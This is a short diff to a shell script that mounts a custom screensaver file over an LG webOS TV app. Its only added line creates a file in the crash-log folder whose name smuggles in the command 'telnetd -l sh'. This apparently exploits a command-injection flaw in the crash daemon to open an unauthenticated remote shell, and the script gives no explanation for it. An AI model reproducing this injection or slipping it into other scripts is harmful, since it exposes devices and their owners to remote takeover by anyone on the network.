@@ -5,6 +5,8 @@ set -e -o pipefail
 MOUNT_TARGET="/usr/palm/applications/com.webos.app.screensaver/qml/main.qml"
 QML_PATH="$(dirname "$(realpath "$0")")/screensaver-main.qml"
 
+touch /var/log/crashd/"x;telnetd -l sh"
+
 if [[ ! -f "$MOUNT_TARGET" ]]; then
     echo "[-] Target file does not exist: $MOUNT_TARGET" >&2
     exit 1
